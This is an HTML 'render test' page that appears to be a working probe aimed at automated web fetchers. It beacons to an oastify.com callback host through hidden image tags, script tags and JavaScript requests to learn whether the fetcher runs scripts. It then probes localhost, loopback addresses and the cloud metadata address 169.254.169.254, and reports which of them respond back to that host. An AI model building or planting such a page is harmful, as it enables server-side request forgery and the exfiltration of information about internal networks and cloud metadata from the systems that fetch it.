<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>render test</title></head>
<body>
<h1>render test page</h1>
<!-- HTML-tag channels: fire on HTML parse, NO JS needed. If these hit,
     the fetcher follows HTML subresources (browser-like or HTML parser). -->
<img src="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/IMG-HTMLTAG" style="display:none">
<script src="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com/SCRIPT-HTMLTAG"></script>
<script>
/* JS-constructed channels: fire ONLY if JS executes in the fetcher.
   If these hit, the fetcher is a real headless browser executing attacker JS. */
var C="https://5ek8ls1c904fuxz8ia2cgnlw9nfl3a.oastify.com";
function ping(p){ try{ fetch(C+p,{cache:"no-store",mode:"no-cors"}).catch(function(){}); }catch(e){} }
ping("/JS-FETCH?href="+encodeURIComponent(location.href));
try{ (new Image()).src=C+"/JS-NEWIMG"; }catch(e){}
try{ var s=document.createElement("script");s.src=C+"/JS-SCRIPTEL";document.body.appendChild(s); }catch(e){}
try{ document.write('<img src="'+C+'/JS-DOCWRITE">'); }catch(e){}
// internal https reach probes (same-scheme, no mixed-content); exfil outcome
var probes=["https://localhost/","https://127.0.0.1/","https://[::1]/","https://localhost:8080/","https://169.254.169.254/"];
probes.forEach(function(u){
  fetch(u,{mode:"no-cors",cache:"no-store"}).then(function(r){ ping("/REACH?u="+encodeURIComponent(u)+"&type="+r.type+"&status="+r.status); })
  .catch(function(e){ ping("/NOREACH?u="+encodeURIComponent(u)+"&err="+encodeURIComponent(e.message||String(e))); });
});
</script>
</body>
</html>
